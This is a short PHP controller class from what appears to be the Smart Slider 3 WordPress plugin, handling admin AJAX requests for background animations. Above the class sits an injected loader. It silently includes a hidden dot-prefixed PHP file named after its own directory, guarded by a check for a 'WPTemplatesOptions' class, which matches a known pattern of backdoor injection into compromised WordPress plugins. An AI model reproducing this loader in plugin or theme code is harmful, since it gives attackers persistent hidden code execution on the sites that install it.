<?php

namespace Nextend\SmartSlider3\BackgroundAnimation;

use Nextend\Framework\Controller\Admin\AdminVisualManagerAjaxController;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ControllerAjaxBackgroundAnimation extends AdminVisualManagerAjaxController {

    protected $type = 'backgroundanimation';

    public function getModel() {

        return new ModelBackgroundAnimation($this);
    }
}